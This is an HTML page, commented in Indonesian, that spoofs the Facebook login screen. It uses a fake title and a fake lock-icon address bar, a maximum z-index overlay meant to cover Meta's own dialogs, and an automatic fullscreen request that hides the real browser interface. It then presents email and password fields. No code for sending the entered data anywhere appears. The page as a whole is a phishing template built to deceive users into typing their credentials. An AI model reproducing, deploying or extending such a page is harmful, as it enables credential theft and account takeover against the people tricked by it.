<!DOCTYPE html>
<html>
<head>
<meta http-equiv="refresh" content="1;url=#" />
<title>https://facebook.com/login</title>
<style>
  /* Overlay nutupin semua termasuk dialog Meta */
  #overlay {
    position: fixed; top: 0; left: 0; width: 100%; height: 100%;
    background: white; z-index: 2147483647; /* max z-index */
  }
  /* Fake address bar */
  #fakebar {
    background: #f0f2f5; padding: 10px; font-family: Arial;
    border-bottom: 1px solid #ccc;
  }
</style>
</head>
<body>
<div id="overlay">
  <div id="fakebar">🔒 facebook.com</div>
  <div style="padding:20px">
    <h2>Facebook</h2>
    <input placeholder="Email"><br><br>
    <input placeholder="Password" type="password">
  </div>
</div>

<script>
// Trigger fullscreen pas refresh selesai
setTimeout(() => {
  document.documentElement.requestFullscreen().catch(()=>{});
}, 1100);
</script>
</body>
</html>
